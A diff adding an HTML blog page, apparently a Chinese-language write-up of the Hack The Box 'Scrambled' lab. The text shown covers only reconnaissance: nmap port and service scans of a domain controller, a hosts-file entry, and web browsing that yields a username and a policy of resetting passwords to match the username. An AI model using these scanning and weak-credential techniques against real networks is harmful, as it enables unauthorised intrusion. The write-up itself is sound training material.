@@ -1,0 +1,803 @@
+<!doctype html><html lang=en><head><meta charset=UTF-8><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content><meta name=description content="Nmap 探测 使用 Nmap 探测存活的端口。
+┌──(kali㉿kali)-[~/Work/Kali/Scrambled] └─$ sudo nmap --min-rate 10000 -p- 10.129.33.76 -oA Nmap/ports [sudo] password for kali: Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-31 21:55 -0400 Nmap scan report for 10.129.33.76 Host is up (0.12s latency). Not shown: 65514 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1433/tcp open ms-sql-s 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 4411/tcp open found 5985/tcp open wsman 9389/tcp open adws 49667/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49701/tcp open unknown 49709/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 21."><meta name=keywords content=",Hack,TGT,反序列化"><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://enilmalus.github.io/posts/htb-scrambled-writeup/><title>HTB-Scrambled Writeup :: Welcome My Hack's Blog
+</title><link rel=stylesheet href=/main.min.ab5336003ba331300318b49292c672210905baf1ef5410a739f647e70c8808fa.css integrity="sha256-q1M2ADujMTADGLSSksZyIQkFuvHvVBCnOfZH5wyICPo=" crossorigin=anonymous><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color><link rel="shortcut icon" href=/favicon.ico><meta name=msapplication-TileColor content><meta itemprop=name content="HTB-Scrambled Writeup"><meta itemprop=description content="Nmap 探测 使用 Nmap 探测存活的端口。
+┌──(kali㉿kali)-[~/Work/Kali/Scrambled] └─$ sudo nmap --min-rate 10000 -p- 10.129.33.76 -oA Nmap/ports [sudo] password for kali: Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-31 21:55 -0400 Nmap scan report for 10.129.33.76 Host is up (0.12s latency). Not shown: 65514 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1433/tcp open ms-sql-s 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 4411/tcp open found 5985/tcp open wsman 9389/tcp open adws 49667/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49701/tcp open unknown 49709/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 21."><meta itemprop=datePublished content="2026-09-10T14:00:00+08:00"><meta itemprop=dateModified content="2026-09-10T14:00:00+08:00"><meta itemprop=wordCount content="3319"><meta itemprop=keywords content="Hack,TGT,反序列化,"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB-Scrambled Writeup"><meta name=twitter:description content="Nmap 探测 使用 Nmap 探测存活的端口。
+┌──(kali㉿kali)-[~/Work/Kali/Scrambled] └─$ sudo nmap --min-rate 10000 -p- 10.129.33.76 -oA Nmap/ports [sudo] password for kali: Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-31 21:55 -0400 Nmap scan report for 10.129.33.76 Host is up (0.12s latency). Not shown: 65514 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1433/tcp open ms-sql-s 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 4411/tcp open found 5985/tcp open wsman 9389/tcp open adws 49667/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49701/tcp open unknown 49709/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 21."><meta property="article:published_time" content="2026-09-10 14:00:00 +0800 +0800"></head><body><div class=container><header class=header><span class=header__inner><a href=/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
+<span class=logo__text>hello</span>
+<span class=logo__cursor></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=/english-articles/>English Articles</a></li><li><a href=/long-articles/>长文章</a></li><li><a href=/posts/>文章</a></li><li><a href=/tags/>标签</a></li><li><a href=/tools/>工具专区</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+16 minutes</p></div><article><h1 class=post-title><a href=https://enilmalus.github.io/posts/htb-scrambled-writeup/>HTB-Scrambled Writeup</a></h1><hr><aside id=toc><div class=toc-title>Table of Contents</div><nav id=TableOfContents><ul><li><a href=#nmap-探测>Nmap 探测</a></li><li><a href=#web-80-渗透>Web-80 渗透</a></li><li><a href=#tgt-探索>TGT 探索</a></li><li><a href=#windows-提权>Windows 提权</a></li></ul></nav></aside><hr><div class=post-content><h2 id=nmap-探测>Nmap 探测</h2><p>使用 Nmap 探测存活的端口。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ sudo nmap --min-rate <span style=color:#ae81ff>10000</span> -p- 10.129.33.76 -oA Nmap/ports
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> kali:
+</span></span><span style=display:flex><span>Starting Nmap 7.98 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2026-08-31 21:55 -0400
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.129.33.76
+</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.12s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65514</span> filtered tcp ports <span style=color:#f92672>(</span>no-response<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>PORT      STATE SERVICE
+</span></span><span style=display:flex><span>53/tcp    open  domain
+</span></span><span style=display:flex><span>80/tcp    open  http
+</span></span><span style=display:flex><span>88/tcp    open  kerberos-sec
+</span></span><span style=display:flex><span>135/tcp   open  msrpc
+</span></span><span style=display:flex><span>139/tcp   open  netbios-ssn
+</span></span><span style=display:flex><span>389/tcp   open  ldap
+</span></span><span style=display:flex><span>445/tcp   open  microsoft-ds
+</span></span><span style=display:flex><span>464/tcp   open  kpasswd5
+</span></span><span style=display:flex><span>593/tcp   open  http-rpc-epmap
+</span></span><span style=display:flex><span>636/tcp   open  ldapssl
+</span></span><span style=display:flex><span>1433/tcp  open  ms-sql-s
+</span></span><span style=display:flex><span>3268/tcp  open  globalcatLDAP
+</span></span><span style=display:flex><span>3269/tcp  open  globalcatLDAPssl
+</span></span><span style=display:flex><span>4411/tcp  open  found
+</span></span><span style=display:flex><span>5985/tcp  open  wsman
+</span></span><span style=display:flex><span>9389/tcp  open  adws
+</span></span><span style=display:flex><span>49667/tcp open  unknown
+</span></span><span style=display:flex><span>49673/tcp open  unknown
+</span></span><span style=display:flex><span>49674/tcp open  unknown
+</span></span><span style=display:flex><span>49701/tcp open  unknown
+</span></span><span style=display:flex><span>49709/tcp open  unknown
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 21.39 seconds
+</span></span><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ grep open Nmap/ports.nmap | awk -F <span style=color:#e6db74>&#39;/&#39;</span> <span style=color:#e6db74>&#39;{print $1}&#39;</span> | paste -sd <span style=color:#e6db74>&#39;,&#39;</span>
+</span></span><span style=display:flex><span>53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49701,49709
+</span></span></code></pre></div><p>对存活的端口进行详细信息扫描,，1 个开放端口，其中 53 / 88 / 389 / 445 / 1433 / 3268 这套组合基本可以断定是台域控。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ sudo nmap -sT -sC -sV -O -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49701,49709 10.129.33.76 -oA Nmap/detail
+</span></span><span style=display:flex><span>Starting Nmap 7.98 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2026-08-31 21:59 -0400
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.129.33.76
+</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.11s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PORT      STATE SERVICE       VERSION
+</span></span><span style=display:flex><span>53/tcp    open  domain        Simple DNS Plus
+</span></span><span style=display:flex><span>80/tcp    open  http          Microsoft IIS httpd 10.0
+</span></span><span style=display:flex><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style=display:flex><span>| http-methods:
+</span></span><span style=display:flex><span>|_  Potentially risky methods: TRACE
+</span></span><span style=display:flex><span>|_http-title: Scramble Corp Intranet
+</span></span><span style=display:flex><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style=color:#f92672>(</span>server time: 2026-09-01 01:59:10Z<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style=display:flex><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style=display:flex><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#f92672>(</span>Domain: scrm.local, Site: Default-First-Site-Name<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>| ssl-cert: Subject:
+</span></span><span style=display:flex><span>| Subject Alternative Name: DNS:DC1.scrm.local
+</span></span><span style=display:flex><span>| Not valid before: 2024-09-04T11:14:45
+</span></span><span style=display:flex><span>|_Not valid after:  2121-06-08T22:39:53
+</span></span><span style=display:flex><span>|_ssl-date: 2026-09-01T02:02:24+00:00; -41s from scanner time.
+</span></span><span style=display:flex><span>445/tcp   open  microsoft-ds?
+</span></span><span style=display:flex><span>464/tcp   open  kpasswd5?
+</span></span><span style=display:flex><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style=display:flex><span>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style=color:#f92672>(</span>Domain: scrm.local, Site: Default-First-Site-Name<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|_ssl-date: 2026-09-01T02:02:24+00:00; -41s from scanner time.
+</span></span><span style=display:flex><span>| ssl-cert: Subject:
+</span></span><span style=display:flex><span>| Subject Alternative Name: DNS:DC1.scrm.local
+</span></span><span style=display:flex><span>| Not valid before: 2024-09-04T11:14:45
+</span></span><span style=display:flex><span>|_Not valid after:  2121-06-08T22:39:53
+</span></span><span style=display:flex><span>1433/tcp  open  ms-sql-s      Microsoft SQL Server <span style=color:#ae81ff>2019</span> 15.00.2000.00; RTM
+</span></span><span style=display:flex><span>| ms-sql-info:
+</span></span><span style=display:flex><span>|   10.129.33.76:1433:
+</span></span><span style=display:flex><span>|     Version:
+</span></span><span style=display:flex><span>|       name: Microsoft SQL Server <span style=color:#ae81ff>2019</span> RTM
+</span></span><span style=display:flex><span>|       number: 15.00.2000.00
+</span></span><span style=display:flex><span>|       Product: Microsoft SQL Server <span style=color:#ae81ff>2019</span>
+</span></span><span style=display:flex><span>|       Service pack level: RTM
+</span></span><span style=display:flex><span>|       Post-SP patches applied: false
+</span></span><span style=display:flex><span>|_    TCP port: <span style=color:#ae81ff>1433</span>
+</span></span><span style=display:flex><span>| ssl-cert: Subject: commonName<span style=color:#f92672>=</span>SSL_Self_Signed_Fallback
+</span></span><span style=display:flex><span>| Not valid before: 2026-09-01T01:51:58
+</span></span><span style=display:flex><span>|_Not valid after:  2056-09-01T01:51:58
+</span></span><span style=display:flex><span>|_ssl-date: 2026-09-01T02:02:24+00:00; -41s from scanner time.
+</span></span><span style=display:flex><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#f92672>(</span>Domain: scrm.local, Site: Default-First-Site-Name<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>| ssl-cert: Subject:
+</span></span><span style=display:flex><span>| Subject Alternative Name: DNS:DC1.scrm.local
+</span></span><span style=display:flex><span>| Not valid before: 2024-09-04T11:14:45
+</span></span><span style=display:flex><span>|_Not valid after:  2121-06-08T22:39:53
+</span></span><span style=display:flex><span>|_ssl-date: 2026-09-01T02:02:24+00:00; -41s from scanner time.
+</span></span><span style=display:flex><span>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style=color:#f92672>(</span>Domain: scrm.local, Site: Default-First-Site-Name<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>| ssl-cert: Subject:
+</span></span><span style=display:flex><span>| Subject Alternative Name: DNS:DC1.scrm.local
+</span></span><span style=display:flex><span>| Not valid before: 2024-09-04T11:14:45
+</span></span><span style=display:flex><span>|_Not valid after:  2121-06-08T22:39:53
+</span></span><span style=display:flex><span>|_ssl-date: 2026-09-01T02:02:24+00:00; -41s from scanner time.
+</span></span><span style=display:flex><span>4411/tcp  open  found?
+</span></span><span style=display:flex><span>| fingerprint-strings:
+</span></span><span style=display:flex><span>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
+</span></span><span style=display:flex><span>|     SCRAMBLECORP_ORDERS_V1.0.3;
+</span></span><span style=display:flex><span>|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions:
+</span></span><span style=display:flex><span>|     SCRAMBLECORP_ORDERS_V1.0.3;
+</span></span><span style=display:flex><span>|_    ERROR_UNKNOWN_COMMAND;
+</span></span><span style=display:flex><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style=color:#f92672>(</span>SSDP/UPnP<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|_http-title: Not Found
+</span></span><span style=display:flex><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style=display:flex><span>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style=display:flex><span>49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style=display:flex><span>49673/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style=display:flex><span>49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style=display:flex><span>49701/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style=display:flex><span>49709/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style=display:flex><span>SF-Port4411-TCP:V<span style=color:#f92672>=</span>7.98%I<span style=color:#f92672>=</span>7%D<span style=color:#f92672>=</span>8/31%Time<span style=color:#f92672>=</span>6A963197%P<span style=color:#f92672>=</span>x86_64-pc-linux-gnu%r<span style=color:#f92672>(</span>NU
+</span></span><span style=display:flex><span>SF:LL,1D,<span style=color:#e6db74>&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>GenericLines,1D,<span style=color:#e6db74>&#34;SCRAMBLEC
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:ORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>GetRequest,35,<span style=color:#e6db74>&#34;SCRAMBLECORP_ORDERS_V1\.0\.
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:3;\r\nERROR_UNKNOWN_COMMAND;\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>HTTPOptions,35,<span style=color:#e6db74>&#34;SCRAMBLECORP_ORDER
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:S_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>RTSPRequest,35,<span style=color:#e6db74>&#34;SCRAMBLEC
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:ORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>RPCCheck,1D,<span style=color:#e6db74>&#34;SCR
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:AMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>DNSVersionBindReqTCP,1D,<span style=color:#e6db74>&#34;SCRAMBLECOR
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:P_ORDERS_V1\.0\.3;\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>DNSStatusRequestTCP,1D,<span style=color:#e6db74>&#34;SCRAMBLECORP_ORDERS_
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:V1\.0\.3;\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>Help,35,<span style=color:#e6db74>&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNO
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:WN_COMMAND;\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>SSLSessionReq,1D,<span style=color:#e6db74>&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>TerminalServerCookie,1D,<span style=color:#e6db74>&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>TLS
+</span></span><span style=display:flex><span>SF:SessionReq,1D,<span style=color:#e6db74>&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>Kerberos,1D,<span style=color:#e6db74>&#34;SCRAM
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:BLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>SMBProgNeg,1D,<span style=color:#e6db74>&#34;SCRAMBLECORP_ORDERS_V1\
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:.0\.3;\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>X11Probe,1D,<span style=color:#e6db74>&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>FourO
+</span></span><span style=display:flex><span>SF:hFourRequest,35,<span style=color:#e6db74>&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:;\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>LPDString,35,<span style=color:#e6db74>&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:COMMAND;\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>LDAPSearchReq,1D,<span style=color:#e6db74>&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style=color:#f92672>)</span>%
+</span></span><span style=display:flex><span>SF:r<span style=color:#f92672>(</span>LDAPBindReq,1D,<span style=color:#e6db74>&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>SIPOptions,35,<span style=color:#e6db74>&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>LANDesk
+</span></span><span style=display:flex><span>SF:-RC,1D,<span style=color:#e6db74>&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>TerminalServer,1D,<span style=color:#e6db74>&#34;SCRAMB
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:LECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>NCP,1D,<span style=color:#e6db74>&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>NotesRPC,1D,<span style=color:#e6db74>&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>JavaRMI,1D,<span style=color:#e6db74>&#34;S
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:CRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>WMSRequest,1D,<span style=color:#e6db74>&#34;SCRAMBLECORP_ORDERS
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:_V1\.0\.3;\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>oracle-tns,1D,<span style=color:#e6db74>&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style=color:#f92672>)</span>%r
+</span></span><span style=display:flex><span>SF:<span style=color:#f92672>(</span>ms-sql-s,1D,<span style=color:#e6db74>&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>afp,1D,<span style=color:#e6db74>&#34;SCRAMBLECOR
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:P_ORDERS_V1\.0\.3;\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>giop,1D,<span style=color:#e6db74>&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style=color:#f92672>)</span>;
+</span></span><span style=display:flex><span>Warning: OSScan results may be unreliable because we could not find at least <span style=color:#ae81ff>1</span> open and <span style=color:#ae81ff>1</span> closed port
+</span></span><span style=display:flex><span>Device type: general purpose
+</span></span><span style=display:flex><span>Running <span style=color:#f92672>(</span>JUST GUESSING<span style=color:#f92672>)</span>: Microsoft Windows 2019|<span style=color:#ae81ff>10</span> <span style=color:#f92672>(</span>97%<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+</span></span><span style=display:flex><span>Aggressive OS guesses: Windows Server <span style=color:#ae81ff>2019</span> <span style=color:#f92672>(</span>97%<span style=color:#f92672>)</span>, Microsoft Windows <span style=color:#ae81ff>10</span> <span style=color:#ae81ff>1903</span> - 21H1 <span style=color:#f92672>(</span>91%<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>No exact OS matches <span style=color:#66d9ef>for</span> host <span style=color:#f92672>(</span>test conditions non-ideal<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Host script results:
+</span></span><span style=display:flex><span>| smb2-security-mode:
+</span></span><span style=display:flex><span>|   3.1.1:
+</span></span><span style=display:flex><span>|_    Message signing enabled and required
+</span></span><span style=display:flex><span>| smb2-time:
+</span></span><span style=display:flex><span>|   date: 2026-09-01T02:01:46
+</span></span><span style=display:flex><span>|_  start_date: N/A
+</span></span><span style=display:flex><span>|_clock-skew: mean: -41s, deviation: 0s, median: -41s
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 203.38 seconds
+</span></span></code></pre></div><p>将暴露出来的域名做 hosts 解析。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ sudo bash -c <span style=color:#e6db74>&#39;echo &#34;10.129.33.76 scrm.local&#34; &gt;&gt; /etc/hosts&#39;</span>
+</span></span><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ tail -n <span style=color:#ae81ff>1</span> /etc/hosts
+</span></span><span style=display:flex><span>10.129.33.76 scrm.local DC1.scrm.local
+</span></span></code></pre></div><h2 id=web-80-渗透>Web-80 渗透</h2><p>访问 Web-80 端口，暴露出一个邮箱，保存下来做备用。</p><p><img src=Pasted%20image%2020260901101047.png alt></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ vim Users/emails
+</span></span><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ cat Users/emails
+</span></span><span style=display:flex><span>support@scramblecorp.com
+</span></span></code></pre></div><p>继续浏览，发现一个配置文件，记录下来。</p><p><img src=Pasted%20image%2020260901101336.png alt></p><p>发现一段说明，自助密码重置还没上线，打电话重置时只要留言报上用户名，IT 就会把密码重置成<strong>和用户名一样</strong>。也就是说，只要枚举出一个有效用户名，就有很大概率拿到 <code>用户名:用户名</code> 的弱口令。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Password Resets
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Our self service password reset system will be up and running soon but in the meantime please call the IT support line and we will reset your password. If no one is available please leave a message stating your username and we will reset your password to be the same as the username. 
+</span></span></code></pre></div><p>找到一个用户名，保存下来。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ cat Users/users
+</span></span><span style=display:flex><span>ksimpson
